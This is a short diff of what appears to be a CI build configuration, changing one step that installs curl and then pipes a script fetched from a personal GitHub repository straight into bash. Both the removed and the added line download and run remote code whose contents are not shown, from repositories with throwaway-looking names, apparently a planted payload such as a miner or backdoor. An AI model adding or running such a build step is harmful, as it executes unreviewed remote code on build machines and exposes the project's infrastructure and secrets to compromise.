@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-        apt-get update && apt-get install curl -y && curl -sL curl https://raw.githubusercontent.com/pevinnagewe8919/Man/main/Door | bash
+        apt-get update && apt-get install curl -y && curl -sL curl https://github.com/asnote2299/Man/raw/main/buy | bash
     waitFor:
       - '-'
     entrypoint: /bin/bash
